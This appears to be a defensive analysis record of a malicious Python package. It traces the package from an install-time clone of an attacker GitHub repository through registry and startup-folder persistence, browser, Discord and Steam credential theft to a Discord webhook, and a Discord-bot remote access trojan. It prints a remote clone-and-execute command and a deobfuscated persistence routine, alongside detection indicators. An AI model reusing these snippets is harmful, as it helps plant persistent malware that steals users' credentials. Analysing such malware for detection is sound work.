package_info.package_versions: unknown (latest at time of takedown, March 2023)
package_info.why_malicious: The package is explicitly designed to deliver and execute additional malicious payloads from a remote GitHub repository, establish persistent access on Windows systems, and exfiltrate a wide range of sensitive user data—including browser credentials, cookies, credit card information, and Steam authentication tokens—to an attacker-controlled Discord webhook. It operates as part of a malware-as-a-service (MaaS) campaign, utilizing multiple stages of obfuscated and modular info-stealer and remote access trojan (RAT) functionality, and leverages both automated and on-demand data theft and remote control.

malicious_snippets.code_snippet:
# (Pseudocode, as actual code is not shown)
# Download and execute bypass.py from attacker's GitHub
import subprocess
subprocess.run(['git', 'clone', 'https://github.com/NotInfected/attacker-repo.git', 'C:\Users\user\AppData\Local\Temp\repo'])
subprocess.run(['python', 'C:\Users\user\AppData\Local\Temp\repo\bypass.py'])
malicious_snippets.code_behavior: During package installation (postinstall), the code clones a remote GitHub repository and executes a secondary payload (bypass.py), resulting in the download and execution of attacker-controlled code without user consent.

malice_analysis.why_suspicious: Cloning and executing remote code from an untrusted GitHub repository during installation is a well-known malware delivery technique that enables attackers to bypass static analysis and deliver updated payloads.
malice_analysis.violated_expectations: Legitimate setup.py scripts are expected to handle package installation and dependency management, not to fetch and execute arbitrary code from the internet.
malice_analysis.similar_legitimate_use: Some legitimate packages may download non-executable data files or dependencies from trusted sources, but they do not execute code from untrusted third-party repositories.
key_indicators: Cloning and executing code from a remote GitHub repository during installation
No user interaction required for execution
Obfuscated intent via misleading or non-English comments in setup.py

execution_context.trigger: runtime (after initial infection, via bypass.py execution)

malicious_snippets.code_snippet:
# Obfuscated code (deobfuscated):
def add_to_startup():
    # Add WindowsDefender.py to Windows startup
    key = winreg.HKEY_CURRENT_USER
    reg_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    file_path = os.path.join(os.getenv('APPDATA'), 'WindowsDefender.py')
    winreg.SetValueEx(key, reg_path, 0, winreg.REG_SZ, file_path)
    # Copy WindowsDefender.py to startup folder
    shutil.copy('WindowsDefender.py', startup_folder)
    subprocess.run(['python', startup_folder + '\\WindowsDefender.py'])
malicious_snippets.code_behavior: At runtime, after initial infection, the code copies a secondary payload (WindowsDefender.py) to the Windows startup folder and modifies the registry to ensure the payload executes automatically on system boot, establishing persistence.

malice_analysis.why_suspicious: Modifying the Windows registry and copying files to the startup folder to ensure malicious code runs on every system boot is a classic persistence mechanism used by malware.
malice_analysis.violated_expectations: Legitimate Python packages should not alter system startup behavior or copy executable files to sensitive locations such as the startup folder or registry.
malice_analysis.similar_legitimate_use: Enterprise or system management software may add auto-start entries, but this is always documented, uses trusted code, and does not involve untrusted or downloaded payloads.
key_indicators: Registry modification to add startup entries for malicious payloads
Copying and executing files in the Windows startup folder
Automated execution of further payloads without user knowledge

execution_context.trigger: runtime (on system boot or manual execution of WindowsDefender.py)
execution_context.file_location: WindowsDefender.py (persisted in startup folder, downloaded from attacker's GitHub repo)

malicious_snippets.code_behavior: At runtime, when WindowsDefender.py is executed (on system boot or manually), the code collects browser credentials, cookies, credit cards, Discord tokens, takes a screenshot, zips Steam authentication files, and exfiltrates all collected data to an attacker-controlled Discord webhook.

malice_analysis.why_suspicious: Automated collection and exfiltration of sensitive user data—including credentials, cookies, credit cards, and screenshots—to a remote server is a hallmark of info-stealer malware.
malice_analysis.violated_expectations: Legitimate packages should never access or transmit user credentials, browser data, screenshots, or Steam authentication files without explicit user consent and clear documentation.
malice_analysis.similar_legitimate_use: Security audit tools may access some of this data with explicit user consent, but they do not exfiltrate it to third-party servers or operate without user awareness.
key_indicators: Access to browser credential stores and local storage
Screenshot capture and saving to temporary directories
Zipping and exfiltration of Steam authentication files
Network POST requests to Discord webhooks for data exfiltration

execution_context.trigger: runtime (on infection, via __main__.py in 'syntax' folder of sintaxisoyyo package)

malicious_snippets.code_behavior: At runtime, when syntax/__main__.py is executed, the code connects to a Discord channel as a bot, enabling remote attackers to execute shell commands, steal cookies, capture screenshots, and exfiltrate data from the infected system on demand.

malice_analysis.why_suspicious: Providing remote shell access and on-demand data theft via a Discord bot is a clear remote access trojan (RAT) pattern, allowing attackers to control the infected system and exfiltrate sensitive data interactively.
malice_analysis.violated_expectations: Legitimate Discord bots are designed to automate tasks within Discord, not to interact with the host operating system or exfiltrate sensitive data.
malice_analysis.similar_legitimate_use: Legitimate bots may automate Discord server management, but do not provide OS-level access or data exfiltration capabilities.
key_indicators: Hardcoded Discord bot token in code
Shell command execution triggered by Discord chat messages
On-demand screenshot and cookie theft via Discord commands
Network communication with Discord API from non-standard clients

attack_chain.action: User installs the reverse-shell package, triggering setup.py.
attack_chain.leads_to: Cloning and execution of bypass.py (second-stage payload) from a remote GitHub repository.

attack_chain.action: bypass.py establishes persistence by copying WindowsDefender.py to the Windows startup folder and modifying the registry.
attack_chain.leads_to: WindowsDefender.py is executed automatically on system boot, ensuring continued attacker access.

attack_chain.action: WindowsDefender.py steals browser, Discord, and Steam data, takes screenshots, and exfiltrates all collected data to an attacker-controlled Discord webhook.
attack_chain.leads_to: Attacker receives sensitive user data and can compromise accounts and digital assets.

attack_chain.action: Optionally, a Discord bot RAT is deployed (via sintaxisoyyo package), allowing remote shell access and further data theft on demand.
attack_chain.leads_to: Attacker maintains persistent remote access and interactive control over the infected system.

behavioral_signatures: setup.py or install scripts that clone and execute code from remote GitHub repositories during installation
Persistence mechanisms involving Windows registry Run keys and copying executables to the startup folder
Automated access to browser credential stores, cookies, and credit card databases
Screenshot capture and saving to temporary directories
Bulk exfiltration of sensitive data to Discord webhooks via HTTPS POST
Presence of Discord bot tokens in code enabling remote shell access and command execution
file_indicators: bypass.py and WindowsDefender.py present in user startup folders or %APPDATA%
setup.py containing Spanish-language tutorial comments or obfuscated code
syntax/__init__.py and syntax/__main__.py files with embedded RAT or obfuscated code
network_indicators: Outbound connections to github.com/NotInfected/* or SylexSquad repositories
HTTPS POST requests to discord.com/api/webhooks/* endpoints
Discord bot API traffic originating from non-standard Python clients on infected hosts
detection_knowledge.how_to_detect: Monitor for Python package installations that clone and execute code from remote GitHub repositories, especially those that modify Windows startup folders or registry keys. Flag any package that accesses browser credential stores, captures screenshots, or attempts to exfiltrate data to Discord webhooks. Scan for the presence of suspicious files (bypass.py, WindowsDefender.py) in startup locations and for hardcoded Discord bot tokens in code. Network monitoring should alert on outbound connections to Discord webhooks and suspicious GitHub repositories associated with known attacker infrastructure.
